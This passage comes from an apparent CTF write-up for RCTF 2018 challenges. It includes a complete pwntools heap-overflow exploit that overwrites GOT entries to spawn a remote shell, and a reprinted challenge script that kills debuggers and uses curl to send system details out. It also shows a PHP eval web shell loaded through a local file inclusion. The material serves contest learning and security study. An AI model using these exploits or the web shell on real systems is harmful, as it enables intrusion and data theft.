</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>note</span> <span class=o>=</span> <span class=nf>calloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>note</span><span class=p>),</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>note</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=o>&amp;</span><span class=n>size</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>note</span><span class=o>-&gt;</span><span class=n>ptr</span> <span class=o>=</span> <span class=nf>calloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>ptr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>ptr</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>note</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>31</span> <span class=o>&amp;&amp;</span> <span class=n>g_notes</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=o>++</span><span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>g_notes</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>note</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>++</span><span class=n>g_num_notes</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Options 2 edits a note:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>edit</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>read_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>note</span> <span class=o>*</span><span class=n>note</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=o>&amp;</span><span class=n>idx</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>g_notes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>note</span> <span class=o>=</span> <span class=n>g_notes</span><span class=p>[</span><span class=n>idx</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>read_size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=o>&amp;</span><span class=n>read_size</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=n>note</span><span class=o>-&gt;</span><span class=n>ptr</span><span class=p>,</span> <span class=n>read_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Option 3 deletes a note:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>delete</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_exactly</span><span class=p>(</span><span class=o>&amp;</span><span class=n>idx</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>idx</span> <span class=o>&gt;</span> <span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>g_notes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span><span class=o>-&gt;</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>g_notes</span><span class=p>[</span><span class=n>idx</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>g_notes</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 class="relative group">Vulnerability<div id=vulnerability-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#vulnerability-2 aria-label=Anchor>#</a></span></h3><p>There&rsquo;s an evident buffer overflow in the edit option.
It reads a size up to 255 bytes, and then reads that many bytes into the note, without regard for the note&rsquo;s allocated size.</p><h3 class="relative group">Exploitation<div id=exploitation-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploitation-2 aria-label=Anchor>#</a></span></h3><p>We allocate a couple notes to get the second note&rsquo;s <code>struct note</code> after the first note&rsquo;s buffer. By overflowing from the first note&rsquo;s buffer into the second note&rsquo;s <code>struct note</code>, we can control the second note&rsquo;s <code>ptr</code> and obtain arbitrary write via edit.
However, we have no leaks.</p><p>I decided to do a partial overwrite of a GOT entry.
I assumed the libc was the same as the other challenges (<code>2.23-0ubuntu10</code>).
There&rsquo;s a GOT entry for <code>alarm</code>, which is close to the <code>exec*</code> family in libc: they differ in the lower 16 bits.
Since the low 12 bits are not affected by ASLR, this is a 4 bit bruteforce, which is absolutely feasible.
We need to make sure <code>alarm</code> has been lazy linked.
It&rsquo;s used at the beginning of <code>main</code>, before the actions loop:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>alarm</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This will be used on the remote server to set a timeout for the process, so <code>alarm</code> will be already resolved by the time we overwrite the GOT.</p><p>While <code>alarm</code> can be hijacked to an <code>exec*</code> function, there are a couple issues.
It&rsquo;s not called after the corruption, and the arguments wouldn&rsquo;t match anyway.
Therefore, I built a chain of corrupted GOT entries to perform an <code>execv</code> call.</p><p>The binary contains this initialization function (called at the beginning of <code>main</code>):</p><pre tabindex=0><code>void __cdecl initialize()
{
  memset(g_notes, 0, 256);
  g_num_notes = 0;
  setvbuf(stdin, 0, 2, 0);
}
</code></pre><p>Remember that <code>g_notes</code> is in BSS (no PIE).
Also, we know we can easily trigger a <code>free</code> at will through option 3.</p><p>The final sequence is:</p><ul><li>write <code>/bin/sh\x00</code> to <code>g_notes</code>;</li><li>partially overwrite <code>alarm</code>&rsquo;s GOT entry with <code>execv</code> (guessing 4 bits);</li><li>overwrite <code>memset</code>&rsquo;s GOT entry with <code>alarm</code>&rsquo;s PLT entry;</li><li>overwrite <code>free</code>&rsquo;s GOT entry with the address of <code>initialize</code>.</li></ul><p>Now we call <code>free</code>, which is hijacked to <code>initialize</code>.
The call to <code>memset(g_notes, 0, 256)</code> will actually go through <code>alarm</code>&rsquo;s PLT and end up calling <code>execv(g_notes, NULL)</code>, which will pop a shell since <code>g_notes</code> contains <code>/bin/sh\x00</code>.</p><pre tabindex=0><code>$ cat flag
RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}
</code></pre><p>Yeah, that&rsquo;s not exactly what I did.
It was meant to be solved via dl-resolve.</p><h3 class="relative group">Exploit code<div id=exploit-code-3 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-code-3 aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s1>&#39;x86_64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buffers</span> <span class=o>=</span> <span class=p>[</span><span class=kc>False</span><span class=p>]</span> <span class=o>*</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>reset</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>buffers</span>
</span></span><span class=line><span class=cl>    <span class=n>buffers</span> <span class=o>=</span> <span class=p>[</span><span class=kc>False</span><span class=p>]</span> <span class=o>*</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>allocate</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>buffers</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>buffers</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p8</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>buffers</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>INITIALIZE</span> <span class=o>=</span> <span class=mh>0x400ad2</span>
</span></span><span class=line><span class=cl><span class=n>BUFFERS</span> <span class=o>=</span> <span class=mh>0x6020c0</span>
</span></span><span class=line><span class=cl><span class=n>ALARM_GOT</span> <span class=o>=</span> <span class=mh>0x602030</span>
</span></span><span class=line><span class=cl><span class=n>ALARM_PLT</span> <span class=o>=</span> <span class=mh>0x400650</span>
</span></span><span class=line><span class=cl><span class=n>MEMSET_GOT</span> <span class=o>=</span> <span class=mh>0x602028</span>
</span></span><span class=line><span class=cl><span class=n>FREE_GOT</span> <span class=o>=</span> <span class=mh>0x602018</span>
</span></span><span class=line><span class=cl><span class=n>EXECV_LOW</span> <span class=o>=</span> <span class=mh>0x860</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>prog</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;Bruteforcing execv&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;rnote4.2018.teamrois.cn&#39;</span><span class=p>,</span> <span class=mi>6767</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>reset</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span> <span class=c1># avoids messing with corrupted idx 0</span>
</span></span><span class=line><span class=cl>    <span class=n>overflow</span> <span class=o>=</span> <span class=n>allocate</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span> <span class=o>=</span> <span class=n>allocate</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=n>overflow</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>31337</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># pwn got</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=n>BUFFERS</span><span class=p>,</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=n>ALARM_GOT</span><span class=p>,</span> <span class=n>p16</span><span class=p>(</span><span class=n>EXECV_LOW</span><span class=p>))</span> <span class=c1># guess 4bit = 0</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=n>MEMSET_GOT</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>ALARM_PLT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=n>FREE_GOT</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>INITIALIZE</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># free(...) -&gt; memset(BUFFERS, 0, 256) -&gt; execv(BUFFERS, 0)</span>
</span></span><span class=line><span class=cl>        <span class=n>delete</span><span class=p>(</span><span class=n>overflow</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;echo PWNED&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;PWNED&#39;</span> <span class=ow>in</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>prog</span><span class=o>.</span><span class=n>success</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;Dropping to shell&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">backdoor<div id=backdoor class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#backdoor aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-12 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-12 aria-label=Anchor>#</a></span></h3><p>We are given the <code>control.sh</code> from the compiler challenge:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># No, flag is not hidden in this file</span>
</span></span><span class=line><span class=cl><span class=c1># This&#39;s entrypoint of backdoor, web</span>
</span></span><span class=line><span class=cl><span class=c1># From here, `compiler` and `backdoor` are independent</span>
</span></span><span class=line><span class=cl><span class=c1># Now dear web player, have fun~</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>debuggers</span><span class=o>=</span><span class=k>$(</span>ps auxf <span class=p>|</span> grep <span class=s2>&#34;wireshark\|tshark\|idaq\|strace\|gdb\|edb\|lldb\|lida\|hopper\|r2\|radare2&#34;</span> <span class=p>|</span> grep -v grep <span class=p>|</span> wc -l<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$debuggers</span><span class=s2>&#34;</span> -ge <span class=s2>&#34;0&#34;</span> <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=k>then</span>
</span></span><span class=line><span class=cl>    curl -d <span class=s2>&#34;Oh, no! He&#39;s debugging! I&#39;ll kill them!!!!!!&#34;</span> -H <span class=s2>&#34;User-Agent: </span><span class=k>$(</span>uname -a<span class=k>)</span><span class=s2>&#34;</span> http://backdoor.2018.teamrois.cn/post.php?action<span class=o>=</span>debugging<span class=se>\&amp;</span><span class=nv>count</span><span class=o>=</span><span class=nv>$debuggers</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>killall -9 wireshark
</span></span><span class=line><span class=cl>killall -9 tshark
</span></span><span class=line><span class=cl>killall -9 idaq
</span></span><span class=line><span class=cl>killall -9 strace
</span></span><span class=line><span class=cl>killall -9 gdb
</span></span><span class=line><span class=cl>killall -9 edb
</span></span><span class=line><span class=cl>killall -9 lldb
</span></span><span class=line><span class=cl>killall -9 lida
</span></span><span class=line><span class=cl>killall -9 hopper
</span></span><span class=line><span class=cl>killall -9 r2
</span></span><span class=line><span class=cl>killall -9 radare2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>head -c100000 /dev/urandom &gt; /tmp/random.txt
</span></span><span class=line><span class=cl>zip -r - /tmp/random.txt <span class=p>|</span> curl -H <span class=s2>&#34;User-Agent: </span><span class=k>$(</span>uname -a<span class=k>)</span><span class=s2>&#34;</span> -F <span class=s1>&#39;file=@-&#39;</span> http://backdoor.2018.teamrois.cn/post.php<span class=se>\?</span>action<span class=se>\=</span>upload -v
</span></span><span class=line><span class=cl>rm /tmp/random.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Did you find the backdoor?&#34;</span> &gt; ~/rctf-backdoor.txt
</span></span></code></pre></div><p>Here we can see two entry points for this challenge:
<code>http://backdoor.2018.teamrois.cn/post.php?action=upload</code>
and
<code>http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</code>.</p><p>The upload action takes a <code>.zip</code> file as input, and loads it to the <code>uploads/</code> directory with a random name. The debugging action seems to be useless.
Both these two pages, at a first sight, may save the user-agent.</p><p>There is also a index.php page, with a wordpress-like login, but it seems pretty useless.</p><h3 class="relative group">Local file inclusion<div id=local-file-inclusion class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#local-file-inclusion aria-label=Anchor>#</a></span></h3><p>After some tries, we see that if we prepend a <code>./</code> to the action parameter, that page loads normally. This means we have a local file inclusion, and after some other successful experiments (like requesting <code>/upload.php</code> or <code>post.php?action=index</code>) we understood that it includes the page from the same directory, appending a <code>.php</code> extension to the value that we requested.
The <code>http://</code> wrapper and the <code>data:</code> wrapper didn&rsquo;t work. But wait, we have a file upload!</p><h3 class="relative group">Remote code execution<div id=remote-code-execution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#remote-code-execution aria-label=Anchor>#</a></span></h3><p>We can upload arbitrary .zip files. So we can zip a <code>bk.php</code> file, use PHP&rsquo;s <code>zip:</code> wrapper, and then include our <code>bk.php</code> file.
Our <code>bk.php</code> is very simple:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>eval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span></code></pre></div><p>We upload it, take its name, and include it with the following request:</p><pre tabindex=0><code>http://backdoor.2018.teamrois.cn/post.php?action=zip://./uploads/&#34;+hash+&#34;%23bk&amp;cmd=system(&#39;cat *&#39;);
</code></pre><p>Where hash is the name of the uploaded zip. This request will print the flag: RCTF{the_way_1t_leAds_mE_To_be_In_1ove}</p><h2 class="relative group">r-cursive<div id=r-cursive class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#r-cursive aria-label=Anchor>#</a></span></h2><h3 class="relative group">Overview<div id=overview-13 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-13 aria-label=Anchor>#</a></span></h3><blockquote><p>LUL dat font
<a href=http://r-cursive.ml target=_blank>http://r-cursive.ml</a></p></blockquote><p>Hint:</p><blockquote><p>If you get stuck after arbitrary code execution, try to escape the sandbox. phpinfo may help you figure out how the sandbox works.</p></blockquote><h3 class="relative group">Remote Code Execution<div id=remote-code-execution-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#remote-code-execution-1 aria-label=Anchor>#</a></span></h3><p>Going to <code>http://r-cursive.ml</code> gives us a page with the following source code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$token</span> <span class=o>=</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nv>$dir</span> <span class=o>=</span> <span class=s1>&#39;../sandbox/&#39;</span><span class=o>.</span><span class=nv>$token</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>is_dir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>)</span> <span class=o>?:</span> <span class=nx>mkdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>is_file</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s1>&#39;index.php&#39;</span><span class=p>)</span> <span class=o>?:</span> <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$dir</span><span class=o>.</span><span class=s1>&#39;index.php&#39;</span><span class=p>,</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;#SHA1#&#39;</span><span class=p>,</span> <span class=nv>$token</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;./template&#39;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>]</span> <span class=o>?:</span> <span class=s1>&#39;&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=s1>&#39;go&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: http://&#39;</span><span class=o>.</span><span class=nv>$token</span><span class=o>.</span><span class=s1>&#39;.sandbox.r-cursive.ml:1337/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=s1>&#39;reset&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf &#39;</span><span class=o>.</span><span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
